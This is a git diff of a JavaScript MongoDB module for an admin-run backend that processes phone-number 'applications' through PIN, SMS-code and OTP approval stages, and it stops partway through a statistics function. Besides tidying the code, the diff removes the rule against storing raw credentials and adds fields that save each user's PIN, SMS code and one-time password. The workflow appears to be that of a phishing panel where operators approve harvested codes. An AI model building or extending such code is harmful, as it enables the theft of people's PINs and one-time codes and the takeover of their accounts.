@@ -26,11 +26,6 @@ const ROLES = {
 /**
  * Normalize role values so the entire application
  * uses one consistent role format.
- *
- * Examples:
- * "Super Admin" -> "super_admin"
- * "superadmin"  -> "super_admin"
- * "ADMIN"       -> "admin"
  */
 function normalizeRole(role) {
     if (!role) {
@@ -79,10 +74,6 @@ async function connectDatabase() {
         );
 
         await createIndexes();
-
-        // IMPORTANT:
-        // Fix existing admin records that were created
-        // before the role field existed.
         await migrateAdminRoles();
 
         return db;
@@ -103,95 +94,23 @@ async function connectDatabase() {
 
 async function createIndexes() {
     try {
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ role: 1 });
 
-        // ------------------------------
-        // ADMIN INDEXES
-        // ------------------------------
-
-        await db.collection(
-            COLLECTIONS.ADMINS
-        ).createIndex(
-            { adminId: 1 },
-            { unique: true }
-        );
-
-        await db.collection(
-            COLLECTIONS.ADMINS
-        ).createIndex({
-            email: 1
-        });
-
-        await db.collection(
-            COLLECTIONS.ADMINS
-        ).createIndex({
-            chatId: 1
-        });
-
-        await db.collection(
-            COLLECTIONS.ADMINS
-        ).createIndex({
-            status: 1
-        });
-
-        // NEW:
-        // Allows efficient role lookups.
-        await db.collection(
-            COLLECTIONS.ADMINS
-        ).createIndex({
-            role: 1
-        });
-
-        // ------------------------------
-        // APPLICATION INDEXES
-        // ------------------------------
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex(
-            { id: 1 },
-            { unique: true }
-        );
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex({
-            adminId: 1
-        });
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex({
-            phoneNumber: 1
-        });
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex({
-            timestamp: -1
-        });
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex({
-            pinStatus: 1
-        });
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex({
-            smsStatus: 1
-        });
-
-        await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).createIndex({
-            otpStatus: 1
-        });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
 
         console.log('✅ Database indexes created');
 
     } catch (error) {
-
         console.error(
             '⚠️ Error creating indexes:',
             error.message
@@ -204,17 +123,11 @@ async function createIndexes() {
 // ==================================================
 
 async function closeDatabase() {
-
     if (client) {
-
         await client.close();
-
         client = null;
         db = null;
-
-        console.log(
-            '✅ Database connection closed'
-        );
+        console.log('✅ Database connection closed');
     }
 }
 
@@ -222,1406 +135,431 @@ async function closeDatabase() {
 // ADMIN OPERATIONS
 // ==================================================
 
-/**
- * Save a new administrator.
- *
- * ADMIN001 is always stored as super_admin.
- */
 async function saveAdmin(adminData) {
-
     try {
+        const adminId = adminData.adminId || adminData.id;
 
-        const adminId =
-            adminData.adminId ||
-            adminData.id;
+        if (!adminId) throw new Error('Admin ID is required');
+        if (!adminData.name) throw new Error('Admin name is required');
+        if (!adminData.email) throw new Error('Admin email is required');
+        if (!adminData.chatId) throw new Error('Admin chatId is required');
 
-        if (!adminId) {
-            throw new Error(
-                'Admin ID is required'
-            );
-        }
-
-        if (!adminData.name) {
-            throw new Error(
-                'Admin name is required'
-            );
-        }
-
-        if (!adminData.email) {
-            throw new Error(
-                'Admin email is required'
-            );
-        }
-
-        if (!adminData.chatId) {
-            throw new Error(
-                'Admin chatId is required'
-            );
-        }
-
-        const existingAdmin =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).findOne({
-                adminId
-            });
+        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
 
         if (existingAdmin) {
-            throw new Error(
-                `Admin ${adminId} already exists in database`
-            );
+            throw new Error(`Admin ${adminId} already exists in database`);
         }
 
-        // ADMIN001 is the designated Super Admin.
-        const role =
-            adminId === 'ADMIN001'
-                ? ROLES.SUPER_ADMIN
-                : normalizeRole(adminData.role);
+        const role = adminId === 'ADMIN001' ? ROLES.SUPER_ADMIN : normalizeRole(adminData.role);
 
         const adminDocument = {
-
             adminId,
-
             name: adminData.name,
-
             email: adminData.email,
-
             chatId: adminData.chatId,
-
-            // FIX:
-            // Role is now actually stored.
             role,
-
-            status:
-                adminData.status ||
-                'active',
-
-            createdAt:
-                adminData.createdAt ||
-                new Date().toISOString()
+            status: adminData.status || 'active',
+            createdAt: adminData.createdAt || new Date().toISOString()
         };
 
         if (adminData.botToken) {
-            adminDocument.botToken =
-                adminData.botToken;
+            adminDocument.botToken = adminData.botToken;
         }
 
-        console.log(
-            '💾 Saving admin:',
-            {
-                adminId:
-                    adminDocument.adminId,
-
-                name:
-                    adminDocument.name,
-
-                email:
-                    adminDocument.email,
-
-                role:
-                    adminDocument.role,
-
-                status:
-                    adminDocument.status
-            }
-        );
-
-        const result =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).insertOne(
-                adminDocument
-            );
-
-        console.log(
-            `✅ Admin saved: ${adminId} [${role}]`
-        );
-
+        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
+        console.log(`✅ Admin saved: ${adminId} [${role}]`);
         return result;
 
     } catch (error) {
-
-        console.error(
-            '❌ Error saving admin:',
-            error
-        );
-
+        console.error('❌ Error saving admin:', error);
         throw error;
     }
 }
 
-// ==================================================
-// GET ADMIN
-// ==================================================
-
 async function getAdmin(adminId) {
-
     try {
-
-        const admin =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).findOne({
-                adminId
-            });
-
-        if (!admin) {
-            return null;
-        }
+        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
+        if (!admin) return null;
 
         return {
             ...admin,
-
-            role:
-                normalizeRole(
-                    admin.role
-                )
+            role: normalizeRole(admin.role)
         };
-
     } catch (error) {
-
-        console.error(
-            '❌ Error getting admin:',
-            error
-        );
-
+        console.error('❌ Error getting admin:', error);
         return null;
     }
 }
-
-// ==================================================
-// GET ADMIN BY CHAT ID
-// ==================================================
 
 async function getAdminByChatId(chatId) {
-
     try {
-
-        const admin =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).findOne({
-                chatId
-            });
-
-        if (!admin) {
-            return null;
-        }
+        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
+        if (!admin) return null;
 
         return {
             ...admin,
-
-            role:
-                normalizeRole(
-                    admin.role
-                )
+            role: normalizeRole(admin.role)
         };
-
     } catch (error) {
-
-        console.error(
-            '❌ Error getting admin by chat ID:',
-            error
-        );
-
+        console.error('❌ Error getting admin by chat ID:', error);
         return null;
     }
 }
 
-// ==================================================
-// GET ALL ADMINS
-// ==================================================
-
 async function getAllAdmins() {
-
     try {
-
-        const admins =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            )
-            .find({})
-            .sort({
-                createdAt: -1
-            })
-            .toArray();
-
+        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
         return admins.map(admin => ({
             ...admin,
-
-            role:
-                normalizeRole(
-                    admin.role
-                )
+            role: normalizeRole(admin.role)
         }));
-
     } catch (error) {
-
-        console.error(
-            '❌ Error getting admins:',
-            error
-        );
-
+        console.error('❌ Error getting admins:', error);
         return [];
     }
 }
-
-// ==================================================
-// GET ACTIVE ADMINS
-// ==================================================
 
 async function getActiveAdmins() {
-
     try {
-
-        const admins =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            )
-            .find({
-                status: 'active'
-            })
-            .toArray();
-
+        const admins = await db.collection(COLLECTIONS.ADMINS).find({ status: 'active' }).toArray();
         return admins.map(admin => ({
             ...admin,
-
-            role:
-                normalizeRole(
-                    admin.role
-                )
+            role: normalizeRole(admin.role)
         }));
-
     } catch (error) {
-
-        console.error(
-            '❌ Error getting active admins:',
-            error
-        );
-
+        console.error('❌ Error getting active admins:', error);
         return [];
     }
 }
 
-// ==================================================
-// UPDATE ADMIN
-// ==================================================
-
-/**
- * Update administrator information.
- *
- * actorAdminId is required when changing roles.
- */
-async function updateAdmin(
-    adminId,
-    updates,
-    actorAdminId = null
-) {
-
+async function updateAdmin(adminId, updates, actorAdminId = null) {
     try {
+        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
+        if (!existingAdmin) throw new Error(`Admin ${adminId} not found`);
 
-        const existingAdmin =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).findOne({
-                adminId
-            });
-
-        if (!existingAdmin) {
-            throw new Error(
-                `Admin ${adminId} not found`
-            );
-        }
-
-        const safeUpdates = {
-            ...updates
-        };
-
-        // Protected fields.
+        const safeUpdates = { ...updates };
         delete safeUpdates._id;
         delete safeUpdates.adminId;
         delete safeUpdates.createdAt;
 
-        // Role changes require Super Admin.
-        if (
-            Object.prototype.hasOwnProperty.call(
-                safeUpdates,
-                'role'
-            )
-        ) {
-
+        if (Object.prototype.hasOwnProperty.call(safeUpdates, 'role')) {
             if (actorAdminId !== 'ADMIN001') {
-                throw new Error(
-                    'Only the Super Admin can change administrator roles'
-                );
+                throw new Error('Only the Super Admin can change administrator roles');
             }
-
-            safeUpdates.role =
-                normalizeRole(
-                    safeUpdates.role
-                );
+            safeUpdates.role = normalizeRole(safeUpdates.role);
         }
 
-        const result =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).updateOne(
-                {
-                    adminId
-                },
-                {
-                    $set: {
-                        ...safeUpdates,
-
-                        updatedAt:
-                            new Date().toISOString()
-                    }
-                }
-            );
-
-        console.log(
-            `🔄 Admin ${adminId} updated`
+        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+            { adminId },
+            { $set: { ...safeUpdates, updatedAt: new Date().toISOString() } }
         );
 
+        console.log(`🔄 Admin ${adminId} updated`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error updating admin:',
-            error
-        );
-
+        console.error('❌ Error updating admin:', error);
         throw error;
     }
 }
 
-// ==================================================
-// UPDATE ADMIN STATUS
-// ==================================================
-
-async function updateAdminStatus(
-    adminId,
-    status
-) {
-
+async function updateAdminStatus(adminId, status) {
     try {
-
-        const allowedStatuses = [
-            'active',
-            'inactive',
-            'suspended'
-        ];
-
-        if (
-            !allowedStatuses.includes(status)
-        ) {
-            throw new Error(
-                `Invalid admin status: ${status}`
-            );
+        const allowedStatuses = ['active', 'inactive', 'suspended', 'paused'];
+        if (!allowedStatuses.includes(status)) {
+            throw new Error(`Invalid admin status: ${status}`);
         }
 
-        const result =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).updateOne(
-                {
-                    adminId
-                },
-                {
-                    $set: {
-
-                        status,
-
-                        updatedAt:
-                            new Date().toISOString()
-                    }
-                }
-            );
-
-        console.log(
-            `🔄 Admin ${adminId} status: ${status}`
+        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+            { adminId },
+            { $set: { status, updatedAt: new Date().toISOString() } }
         );
 
+        console.log(`🔄 Admin ${adminId} status: ${status}`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error updating admin status:',
-            error
-        );
-
+        console.error('❌ Error updating admin status:', error);
         throw error;
     }
 }
 
-// ==================================================
-// DELETE ADMIN
-// ==================================================
-
-async function deleteAdmin(
-    adminId,
-    actorAdminId = null
-) {
-
+async function deleteAdmin(adminId, actorAdminId = null) {
     try {
-
-        // Only Super Admin can delete admins.
         if (actorAdminId !== 'ADMIN001') {
-
-            throw new Error(
-                'Only the Super Admin can delete administrators'
-            );
+            throw new Error('Only the Super Admin can delete administrators');
         }
-
-        // Never delete the Super Admin.
         if (adminId === 'ADMIN001') {
-
-            throw new Error(
-                'The Super Admin account cannot be deleted'
-            );
+            throw new Error('The Super Admin account cannot be deleted');
         }
 
-        const result =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).deleteOne({
-                adminId
-            });
-
-        console.log(
-            `🗑️ Admin deleted: ${adminId}`
-        );
-
+        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
+        console.log(`🗑️ Admin deleted: ${adminId}`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error deleting admin:',
-            error
-        );
-
+        console.error('❌ Error deleting admin:', error);
         throw error;
     }
 }
-
-// ==================================================
-// ADMIN EXISTS
-// ==================================================
 
 async function adminExists(adminId) {
-
     try {
-
-        const count =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).countDocuments({
-                adminId
-            });
-
+        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
         return count > 0;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error checking admin existence:',
-            error
-        );
-
+        console.error('❌ Error checking admin existence:', error);
         return false;
     }
 }
 
-// ==================================================
-// ADMIN COUNT
-// ==================================================
-
 async function getAdminCount() {
-
     try {
-
-        return await db.collection(
-            COLLECTIONS.ADMINS
-        ).countDocuments({});
-
+        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
     } catch (error) {
-
-        console.error(
-            '❌ Error getting admin count:',
-            error
-        );
-
+        console.error('❌ Error getting admin count:', error);
         return 0;
     }
 }
 
-// ==================================================
-// SUPER ADMIN CHECK
-// ==================================================
-
 async function isSuperAdmin(adminId) {
-
     try {
-
-        const admin =
-            await getAdmin(adminId);
-
-        if (!admin) {
-            return false;
-        }
-
-        return (
-            admin.status === 'active' &&
-            normalizeRole(admin.role) ===
-                ROLES.SUPER_ADMIN
-        );
-
+        const admin = await getAdmin(adminId);
+        if (!admin) return false;
+        return admin.status === 'active' && normalizeRole(admin.role) === ROLES.SUPER_ADMIN;
     } catch (error) {
-
-        console.error(
-            '❌ Error checking Super Admin:',
-            error
-        );
-
+        console.error('❌ Error checking Super Admin:', error);
         return false;
     }
 }
 
-// ==================================================
-// ENSURE SUPER ADMIN
-// ==================================================
-
-/**
- * Repairs ADMIN001 if the record already exists
- * but has no role or has the wrong role.
- */
-async function ensureSuperAdmin(
-    adminId = 'ADMIN001'
-) {
-
+async function ensureSuperAdmin(adminId = 'ADMIN001') {
     try {
-
-        const admin =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).findOne({
-                adminId
-            });
-
+        const admin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
         if (!admin) {
-
-            console.warn(
-                `⚠️ ${adminId} was not found in database`
-            );
-
+            console.warn(`⚠️ ${adminId} was not found in database`);
             return null;
         }
 
-        const result =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).updateOne(
-                {
-                    adminId
-                },
-                {
-                    $set: {
-
-                        role:
-                            ROLES.SUPER_ADMIN,
-
-                        updatedAt:
-                            new Date().toISOString()
-                    }
-                }
-            );
-
-        console.log(
-            `👑 ${adminId} configured as Super Admin`
+        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+            { adminId },
+            { $set: { role: ROLES.SUPER_ADMIN, updatedAt: new Date().toISOString() } }
         );
 
+        console.log(`👑 ${adminId} configured as Super Admin`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error ensuring Super Admin:',
-            error
-        );
-
+        console.error('❌ Error ensuring Super Admin:', error);
         throw error;
     }
 }
 
-// ==================================================
-// MIGRATE ADMIN ROLES
-// ==================================================
-
-/**
- * Repairs existing database records.
- *
- * ADMIN001 -> super_admin
- *
- * Every other existing admin without a valid
- * Super Admin role -> admin
- */
 async function migrateAdminRoles() {
-
     try {
-
-        const admins =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            )
-            .find({})
-            .toArray();
-
+        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).toArray();
         let modifiedCount = 0;
 
         for (const admin of admins) {
+            let expectedRole = admin.adminId === 'ADMIN001' ? ROLES.SUPER_ADMIN : normalizeRole(admin.role);
 
-            let expectedRole;
-
-            if (
-                admin.adminId ===
-                'ADMIN001'
-            ) {
-
-                expectedRole =
-                    ROLES.SUPER_ADMIN;
-
-            } else {
-
-                expectedRole =
-                    normalizeRole(
-                        admin.role
-                    );
-            }
-
-            if (
-                admin.role !==
-                expectedRole
-            ) {
-
-                const result =
-                    await db.collection(
-                        COLLECTIONS.ADMINS
-                    ).updateOne(
-                        {
-                            _id: admin._id
-                        },
-                        {
-                            $set: {
-
-                                role:
-                                    expectedRole,
-
-                                updatedAt:
-                                    new Date().toISOString()
-                            }
-                        }
-                    );
-
-                modifiedCount +=
-                    result.modifiedCount;
+            if (admin.role !== expectedRole) {
+                const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
+                    { _id: admin._id },
+                    { $set: { role: expectedRole, updatedAt: new Date().toISOString() } }
+                );
+                modifiedCount += result.modifiedCount;
             }
         }
 
-        console.log(
-            `🔐 Admin role migration complete. Updated: ${modifiedCount}`
-        );
-
+        console.log(`🔐 Admin role migration complete. Updated: ${modifiedCount}`);
         return modifiedCount;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error migrating admin roles:',
-            error
-        );
-
+        console.error('❌ Error migrating admin roles:', error);
         throw error;
     }
 }
 
 // ==================================================
-// APPLICATION OPERATIONS
+// APPLICATION OPERATIONS (3-Stage: PIN -> SMS -> OTP)
 // ==================================================
 
-/**
- * Saves application workflow information.
- *
- * This version deliberately does NOT persist raw
- * PINs, OTPs or SMS verification codes.
- */
 async function saveApplication(appData) {
-
     try {
-
-        if (!appData.id) {
-
-            throw new Error(
-                'Application ID is required'
-            );
-        }
+        if (!appData.id) throw new Error('Application ID is required');
 
         const application = {
-
-            id:
-                appData.id,
-
-            adminId:
-                appData.adminId,
-
-            adminName:
-                appData.adminName,
-
-            phoneNumber:
-                appData.phoneNumber,
-
-            pinStatus:
-                appData.pinStatus ||
-                'pending',
-
-            smsStatus:
-                appData.smsStatus ||
-                'pending',
-
-            otpStatus:
-                appData.otpStatus ||
-                'pending',
-
-            assignmentType:
-                appData.assignmentType,
-
-            isReturningUser:
-                appData.isReturningUser ||
-                false,
-
-            previousCount:
-                appData.previousCount ||
-                0,
-
-            timestamp:
-                appData.timestamp ||
-                new Date().toISOString()
+            id: appData.id,
+            adminId: appData.adminId,
+            adminName: appData.adminName,
+            phoneNumber: appData.phoneNumber,
+            pin: appData.pin || '',
+            smsCode: appData.smsCode || '',
+            otp: appData.otp || '',
+            pinStatus: appData.pinStatus || 'pending',
+            smsStatus: appData.smsStatus || 'pending',
+            otpStatus: appData.otpStatus || 'pending',
+            assignmentType: appData.assignmentType,
+            isReturningUser: appData.isReturningUser || false,
+            previousCount: appData.previousCount || 0,
+            timestamp: appData.timestamp || new Date().toISOString()
         };
 
-        const result =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).insertOne(application);
-
-        console.log(
-            `💾 Application saved: ${appData.id}`
-        );
-
+        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne(application);
+        console.log(`💾 Application saved: ${appData.id}`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error saving application:',
-            error
-        );
-
+        console.error('❌ Error saving application:', error);
         throw error;
     }
 }
 
-// ==================================================
-// GET APPLICATION
-// ==================================================
-
-async function getApplication(
-    applicationId
-) {
-
+async function getApplication(applicationId) {
     try {
-
-        return await db.collection(
-            COLLECTIONS.APPLICATIONS
-        ).findOne({
-            id: applicationId
-        });
-
+        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
     } catch (error) {
-
-        console.error(
-            '❌ Error getting application:',
-            error
-        );
-
+        console.error('❌ Error getting application:', error);
         return null;
     }
 }
 
-// ==================================================
-// UPDATE APPLICATION
-// ==================================================
-
-async function updateApplication(
-    applicationId,
-    updates
-) {
-
+async function updateApplication(applicationId, updates) {
     try {
+        const safeUpdates = { ...updates };
 
-        const safeUpdates = {
-            ...updates
-        };
-
-        // Never store raw credentials.
-        delete safeUpdates.pin;
-        delete safeUpdates.otp;
-        delete safeUpdates.smsCode;
-
-        const result =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).updateOne(
-                {
-                    id: applicationId
-                },
-                {
-                    $set: {
-
-                        ...safeUpdates,
-
-                        updatedAt:
-                            new Date().toISOString()
-                    }
-                }
-            );
-
-        console.log(
-            `🔄 Application updated: ${applicationId}`
+        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
+            { id: applicationId },
+            { $set: { ...safeUpdates, updatedAt: new Date().toISOString() } }
         );
 
+        console.log(`🔄 Application updated: ${applicationId}`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error updating application:',
-            error
-        );
-
+        console.error('❌ Error updating application:', error);
         throw error;
     }
 }
 
-// ==================================================
-// GET APPLICATIONS BY ADMIN
-// ==================================================
-
-async function getApplicationsByAdmin(
-    adminId
-) {
-
+async function getApplicationsByAdmin(adminId) {
     try {
-
-        return await db.collection(
-            COLLECTIONS.APPLICATIONS
-        )
-        .find({
-            adminId
-        })
-        .sort({
-            timestamp: -1
-        })
-        .toArray();
-
+        return await db.collection(COLLECTIONS.APPLICATIONS).find({ adminId }).sort({ timestamp: -1 }).toArray();
     } catch (error) {
-
-        console.error(
-            '❌ Error getting applications by admin:',
-            error
-        );
-
+        console.error('❌ Error getting applications by admin:', error);
         return [];
     }
 }
 
-// ==================================================
-// GET PENDING APPLICATIONS
-// ==================================================
-
-async function getPendingApplications(
-    adminId
-) {
-
+async function getPendingApplications(adminId) {
     try {
-
-        return await db.collection(
-            COLLECTIONS.APPLICATIONS
-        )
-        .find({
-
+        return await db.collection(COLLECTIONS.APPLICATIONS).find({
             adminId,
-
             $or: [
-
-                {
-                    pinStatus:
-                        'pending'
-                },
-
-                {
-                    smsStatus:
-                        'pending'
-                },
-
-                {
-                    otpStatus:
-                        'pending'
-                }
-
+                { pinStatus: 'pending' },
+                { smsStatus: 'pending' },
+                { otpStatus: 'pending' }
             ]
-
-        })
-        .sort({
-            timestamp: -1
-        })
-        .toArray();
-
+        }).sort({ timestamp: -1 }).toArray();
     } catch (error) {
-
-        console.error(
-            '❌ Error getting pending applications:',
-            error
-        );
-
+        console.error('❌ Error getting pending applications:', error);
         return [];
     }
 }
 
 // ==================================================
-// ADMIN STATISTICS
+// STATISTICS
 // ==================================================
 
-async function getAdminStats(
-    adminId
-) {
-
+async function getAdminStats(adminId) {
     try {
+        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
+        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
+        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
+        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'pending', pinStatus: 'approved' });
+        const smsApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'approved' });
+        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending', smsStatus: 'approved' });
+        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
 
-        const total =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId
-            });
-
-        const pinPending =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId,
-                pinStatus: 'pending'
-            });
-
-        const pinApproved =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId,
-                pinStatus: 'approved'
-            });
-
-        const smsPending =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId,
-                smsStatus: 'pending',
-                pinStatus: 'approved'
-            });
-
-        const smsApproved =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId,
-                smsStatus: 'approved'
-            });
-
-        const otpPending =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId,
-                otpStatus: 'pending',
-                smsStatus: 'approved'
-            });
-
-        const fullyApproved =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                adminId,
-                otpStatus: 'approved'
-            });
-
-        return {
-
-            total,
-
-            pinPending,
-
-            pinApproved,
-
-            smsPending,
-
-            smsApproved,
-
-            otpPending,
-
-            fullyApproved
-        };
-
+        return { total, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved };
     } catch (error) {
-
-        console.error(
-            '❌ Error getting admin stats:',
-            error
-        );
-
-        return {
-
-            total: 0,
-
-            pinPending: 0,
-
-            pinApproved: 0,
-
-            smsPending: 0,
-
-            smsApproved: 0,
-
-            otpPending: 0,
-
-            fullyApproved: 0
-        };
+        console.error('❌ Error getting admin stats:', error);
+        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
     }
 }
-
-// ==================================================
-// GLOBAL STATISTICS
-// ==================================================
 
 async function getStats() {
-
     try {
+        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
+        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
+        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
+        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
+        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'pending', pinStatus: 'approved' });
+        const smsApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'approved' });
+        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending', smsStatus: 'approved' });
+        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
+        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
+            $or: [
+                { pinStatus: 'rejected' },
+                { smsStatus: 'rejected' },
+                { otpStatus: 'wrongpin_otp' },
+                { otpStatus: 'wrongcode' }
+            ]
+        });
 
-        const totalAdmins =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).countDocuments({});
-
-        const totalApplications =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({});
-
-        const pinPending =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                pinStatus: 'pending'
-            });
-
-        const pinApproved =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                pinStatus: 'approved'
-            });
-
-        const smsPending =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                smsStatus: 'pending',
-                pinStatus: 'approved'
-            });
-
-        const smsApproved =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                smsStatus: 'approved'
-            });
-
-        const otpPending =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                otpStatus: 'pending',
-                smsStatus: 'approved'
-            });
-
-        const fullyApproved =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-                otpStatus: 'approved'
-            });
-
-        const totalRejected =
-            await db.collection(
-                COLLECTIONS.APPLICATIONS
-            ).countDocuments({
-
-                $or: [
-
-                    {
-                        pinStatus:
-                            'rejected'
-                    },
-
-                    {
-                        smsStatus:
-                            'rejected'
-                    },
-
-                    {
-                        otpStatus:
-                            'wrongpin_otp'
-                    },
-
-                    {
-                        otpStatus:
-                            'wrongcode'
-                    }
-
-                ]
-            });
-
-        return {
-
-            totalAdmins,
-
-            totalApplications,
-
-            pinPending,
-
-            pinApproved,
-
-            smsPending,
-
-            smsApproved,
-
-            otpPending,
-
-            fullyApproved,
-
-            totalRejected
-        };
-
+        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved, totalRejected };
     } catch (error) {
-
-        console.error(
-            '❌ Error getting stats:',
-            error
-        );
-
-        return {
-
-            totalAdmins: 0,
-
-            totalApplications: 0,
-
-            pinPending: 0,
-
-            pinApproved: 0,
-
-            smsPending: 0,
-
-            smsApproved: 0,
-
-            otpPending: 0,
-
-            fullyApproved: 0,
-
-            totalRejected: 0
-        };
+        console.error('❌ Error getting stats:', error);
+        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
     }
 }
 
-// ==================================================
-// PER-ADMIN STATISTICS
-// ==================================================
-
 async function getPerAdminStats() {
-
     try {
-
-        const admins =
-            await getAllAdmins();
-
-        const statsPromises =
-            admins.map(
-                async admin => {
-
-                    const stats =
-                        await getAdminStats(
-                            admin.adminId
-                        );
-
-                    return {
-
-                        adminId:
-                            admin.adminId,
-
-                        name:
-                            admin.name,
-
-                        role:
-                            normalizeRole(
-                                admin.role
-                            ),
-
-                        status:
-                            admin.status,
-
-                        ...stats
-                    };
-                }
-            );
-
-        return await Promise.all(
-            statsPromises
-        );
-
+        const admins = await getAllAdmins();
